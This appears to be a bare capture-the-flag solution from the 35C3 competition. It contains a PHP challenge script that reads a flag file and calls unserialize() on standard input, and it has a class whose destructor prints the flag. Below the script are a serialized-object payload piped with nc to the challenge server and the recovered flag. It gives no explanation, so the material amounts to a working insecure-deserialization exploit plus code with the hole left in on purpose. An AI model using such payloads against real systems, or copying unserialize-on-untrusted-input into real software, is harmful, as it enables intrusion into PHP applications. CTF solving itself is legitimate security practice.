<?php

$line = trim(fgets(STDIN));

$flag = file_get_contents('/flag');

class B {
  function __destruct() {
    global $flag;
    echo $flag;
  }
}

$a = @unserialize($line);

throw new Exception('Well that was unexpected…');

echo $a;


echo 'O:1:"B":1:{s:37:"catch(Exception $e) {echo $a->$flag;}";}' | nc 35.242.207.13 1

35C3_php_is_fun_php_is_fun
